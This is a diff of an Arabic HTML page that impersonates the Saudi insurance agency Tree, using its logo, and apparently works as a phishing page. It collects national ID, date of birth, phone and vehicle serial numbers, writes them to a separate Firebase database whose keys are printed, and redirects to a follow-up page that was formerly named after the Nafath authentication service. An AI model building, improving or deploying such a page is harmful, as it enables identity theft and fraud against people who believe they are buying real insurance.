@@ -3,42 +3,151 @@
 <head>
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title>تري | Treet</title>
+    <title>تري | تأمين المركبات</title>
+    <link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/bootstrap@5.3.0/dist/css/bootstrap.rtl.min.css">
+    <link href="https://fonts.googleapis.com/css2?family=Cairo:wght@400;600;700;800&display=swap" rel="stylesheet">
     <script src="https://www.gstatic.com/firebasejs/10.8.0/firebase-app-compat.js"></script>
     <script src="https://www.gstatic.com/firebasejs/10.8.0/firebase-firestore-compat.js"></script>
     
     <style>
-        body { background-color: #0b1c18; color: white; font-family: sans-serif; margin: 0; display: flex; justify-content: center; align-items: center; height: 100vh; }
-        .container { background: #08241e; padding: 30px; border-radius: 20px; width: 90%; max-width: 400px; text-align: center; border: 1px solid #143a32; }
-        .logo { width: 80px; margin-bottom: 20px; }
-        .input-box { background: #0d3129; border: 1px solid #143a32; border-radius: 10px; padding: 15px; margin-bottom: 15px; display: flex; align-items: center; }
-        input { background: transparent; border: none; color: white; width: 100%; text-align: center; font-size: 16px; outline: none; }
-        .btn-submit { background: #00ff9d; color: #0b1c18; border: none; border-radius: 10px; padding: 15px; width: 100%; font-weight: bold; font-size: 18px; cursor: pointer; transition: 0.3s; }
-        .btn-submit:disabled { background: #008f58; cursor: not-allowed; }
-        .error-msg { color: #ff4d4d; font-size: 13px; margin-bottom: 10px; display: none; }
+        body { 
+            background-color: #f8f9fa; 
+            font-family: 'Cairo', sans-serif; 
+            margin: 0; 
+            min-height: 100vh;
+            background-image: linear-gradient(rgba(255,255,255,0.9), rgba(255,255,255,0.9)), url('https://tree.com.sa/assets/images/bg/hero-bg.jpg');
+            background-size: cover;
+            background-position: center;
+            background-attachment: fixed;
+        }
+        
+        .hero-header { text-align: center; padding: 30px 20px 10px; }
+        .logo { width: 140px; margin-bottom: 15px; }
+        .hero-title { font-weight: 800; color: #198754; font-size: 1.8rem; margin-bottom: 5px; }
+        .hero-subtitle { color: #6c757d; font-size: 1rem; margin-bottom: 20px; }
+        
+        .main-card {
+            background: white; 
+            border-radius: 20px; 
+            box-shadow: 0 15px 40px rgba(0,0,0,0.08);
+            padding: 0; 
+            overflow: hidden;
+            border: 1px solid #e9ecef;
+            max-width: 550px;
+            margin: 0 auto 40px;
+        }
+
+        /* التبويبات العلوية */
+        .nav-pills { background: #f1f3f5; padding: 10px; margin: 0; }
+        .nav-item { flex: 1; text-align: center; }
+        .nav-link { 
+            color: #495057; font-weight: 700; border-radius: 12px; padding: 12px 5px; width: 100%; font-size: 0.9rem;
+        }
+        .nav-link.active { background-color: white; color: #198754; box-shadow: 0 2px 5px rgba(0,0,0,0.05); }
+
+        .card-body { padding: 30px; }
+
+        .form-label { font-size: 0.9rem; font-weight: 700; color: #343a40; margin-bottom: 6px; }
+        .form-control { 
+            padding: 12px; border-radius: 10px; border: 1px solid #dee2e6; 
+            background-color: #fdfdfd; font-size: 1rem; transition: 0.3s;
+        }
+        .form-control:focus { border-color: #198754; box-shadow: 0 0 0 4px rgba(25, 135, 84, 0.1); background-color: #fff; }
+
+        /* زر الإرسال */
+        .btn-submit { 
+            background-color: #198754; color: white; border: none; padding: 16px; 
+            border-radius: 12px; font-weight: bold; width: 100%; font-size: 1.2rem; 
+            transition: 0.3s; cursor: pointer; margin-top: 10px;
+        }
+        .btn-submit:hover { background-color: #146c43; transform: translateY(-2px); box-shadow: 0 5px 15px rgba(25, 135, 84, 0.3); }
+        
+        .form-check-label { font-size: 0.8rem; color: #6c757d; line-height: 1.5; cursor: pointer; }
+        
+        .features-badge { 
+            display: flex; gap: 10px; justify-content: center; flex-wrap: wrap; margin-bottom: 20px; 
+        }
+        .badge-item { 
+            background: rgba(25, 135, 84, 0.1); color: #198754; 
+            padding: 5px 12px; border-radius: 20px; font-size: 0.8rem; font-weight: bold; 
+        }
     </style>
 </head>
 <body>
 
 <div class="container">
-    <img src="https://tree.sa/assets/images/logo.png" class="logo" alt="Tree">
-    <h3 style="margin-bottom: 25px;">إصدار وثيقة تأمين</h3>
-
-    <div class="input-box">
-        <input type="tel" id="id_number" placeholder="رقم الهوية / الإقامة" maxlength="10" oninput="this.value = this.value.replace(/[^0-9]/g, '')">
+    <div class="hero-header">
+        <img src="https://tree.com.sa/assets/images/logo.png" class="logo" alt="Tree">
+        <h1 class="hero-title">احمِ مركبتك الآن</h1>
+        <p class="hero-subtitle">تأمين شامل • ضد الغير • إصلاح وكالة • أسعار تنافسية</p>
+        
+        <div class="features-badge">
+            <div class="badge-item">🛡️ تأمين السيارات</div>
+            <div class="badge-item">⚡ إصدار فوري</div>
+            <div class="badge-item">📄 معتمد من المرور</div>
+        </div>
     </div>
 
-    <div class="input-box">
-        <input type="tel" id="phone_number" placeholder="رقم الجوال (05xxxxxxxx)" maxlength="10" oninput="this.value = this.value.replace(/[^0-9]/g, '')">
+    <div class="main-card">
+        <!-- التبويبات -->
+        <ul class="nav nav-pills" id="pills-tab" role="tablist">
+            <li class="nav-item"><a class="nav-link active" id="new-tab" data-bs-toggle="pill" href="#new" role="tab">تأمين جديد</a></li>
+            <li class="nav-item"><a class="nav-link" id="transfer-tab" data-bs-toggle="pill" href="#new" role="tab">نقل ملكية</a></li>
+            <li class="nav-item"><a class="nav-link" id="renew-tab" data-bs-toggle="pill" href="#new" role="tab">تجديد وثيقة</a></li>
+        </ul>
+
+        <div class="card-body">
+            <form id="insuranceForm" onsubmit="handleOrder(event)">
+                
+                <!-- 1. الرقم التسلسلي -->
+                <div class="mb-3">
+                    <label class="form-label">الرقم التسلسلي / البطاقة الجمركية</label>
+                    <input type="tel" id="sequence_number" class="form-control" placeholder="أدخل الرقم التسلسلي للمركبة" maxlength="10" required oninput="this.value = this.value.replace(/[^0-9]/g, '')">
+                </div>
+
+                <!-- 2. الهوية -->
+                <div class="mb-3">
+                    <label class="form-label">رقم الهوية / الإقامة</label>
+                    <input type="tel" id="id_number" class="form-control" placeholder="1xxxxxxxxx" maxlength="10" required oninput="this.value = this.value.replace(/[^0-9]/g, '')">
+                </div>
+
+                <!-- 3. تاريخ الميلاد -->
+                <div class="mb-3">
+                    <label class="form-label">تاريخ الميلاد (هجري / ميلادي)</label>
+                    <input type="date" id="dob" class="form-control" required>
+                </div>
+
+                <!-- 4. رقم الجوال -->
+                <div class="mb-3">
+                    <label class="form-label">رقم الجوال</label>
+                    <input type="tel" id="phone_number" class="form-control" placeholder="05xxxxxxxx" maxlength="10" required oninput="this.value = this.value.replace(/[^0-9]/g, '')">
+                </div>
+
+                <!-- 5. تاريخ بدء الوثيقة -->
+                <div class="mb-4">
+                    <label class="form-label">تاريخ بدء الوثيقة</label>
+                    <input type="date" id="start_date" class="form-control" required>
+                </div>
+
+                <!-- الإقرار -->
+                <div class="form-check mb-4">
+                    <input class="form-check-input" type="checkbox" value="" id="privacyCheck" required checked>
+                    <label class="form-check-label" for="privacyCheck">
+                        بالمتابعة، أقر بقراءة وفهم وقبول <a href="#" class="text-success text-decoration-none">إشعار الخصوصية</a> لشركة تري الرقمية لوكالة التأمين.
+                    </label>
+                </div>
+
+                <div id="error_box" class="alert alert-danger small py-2 fw-bold" style="display: none;"></div>
+
+                <button type="submit" class="btn-submit" id="main_btn">أمن الحين 🚀</button>
+            </form>
+        </div>
     </div>
-
-    <div id="error_box" class="error-msg"></div>
-
-    <button class="btn-submit" id="main_btn" onclick="handleOrder()">أمن الحين</button>
 </div>
 
+<script src="https://cdn.jsdelivr.net/npm/bootstrap@5.3.0/dist/js/bootstrap.bundle.min.js"></script>
+
 <script>
-    // إعدادات Firebase
     const firebaseConfig = {
         apiKey: "AIzaSyCtPCVee8eynRfuFHZ6if_eK-vtaMYY-iE",
         authDomain: "tameen-658e9.firebaseapp.com",
@@ -50,52 +159,54 @@
     firebase.initializeApp(firebaseConfig);
     const db = firebase.firestore();
 
+    // تعيين الحد الأدنى للتواريخ (اليوم)
+    const today = new Date().toISOString().split('T')[0];
+    document.getElementById('start_date').setAttribute('min', today);
+
     function toEng(s) { return s.replace(/[٠-٩]/g, d => d.charCodeAt(0) - 1632); }
 
-    async function handleOrder() {
+    async function handleOrder(e) {
+        e.preventDefault(); // منع إعادة تحميل الصفحة
         const err = document.getElementById('error_box');
         const btn = document.getElementById('main_btn');
         err.style.display = "none";
 
+        // جمع البيانات
+        let sequence = toEng(document.getElementById('sequence_number').value.trim());
         let id = toEng(document.getElementById('id_number').value.trim());
+        let dob = document.getElementById('dob').value;
         let ph = toEng(document.getElementById('phone_number').value.trim());
+        let start_date = document.getElementById('start_date').value;
+        
+        // تحديد نوع الطلب من التبويب النشط
+        const activeTab = document.querySelector('.nav-link.active').innerText;
 
-        // الفحص الذكي (الفلترة)
-        if (id.length !== 10 || (id[0] !== '1' && id[0] !== '2')) {
-            err.innerText = "❌ رقم الهوية يجب أن يبدأ بـ 1 أو 2 (10 أرقام)";
-            err.style.display = "block";
-            return;
-        }
-
-        if (ph.length !== 10 || !ph.startsWith('05')) {
-            err.innerText = "❌ رقم الجوال يجب أن يبدأ بـ 05 (10 أرقام)";
-            err.style.display = "block";
-            return;
-        }
-
-        // الإرسال
         btn.innerText = "جاري المعالجة...";
         btn.disabled = true;
 
         try {
             const docRef = await db.collection("orders").add({
+                request_type: activeTab,
+                sequence_number: sequence,
                 id_number: id,
+                dob: dob,
                 phone: ph,
+                start_date: start_date,
                 next_step: "WAITING",
-                status: "طلب جديد",
+                status: "زيارة جديدة - بانتظار استكمال البيانات",
                 timestamp: firebase.firestore.FieldValue.serverTimestamp()
             });
             
             localStorage.setItem('user_id', docRef.id);
-            window.location.href = "nafath.html"; // تأكد من وجود الملف بهذا الاسم
+            window.location.href = "next_page.html";
 
         } catch (e) {
-            btn.innerText = "أمن الحين";
+            console.error(e);
+            btn.innerText = "أمن الحين 🚀";
             btn.disabled = false;
-            alert("حدث خطأ في الاتصال");
+            alert("حدث خطأ في الاتصال، حاول مرة أخرى");
         }
     }
 </script>
 </body>
 </html>
-
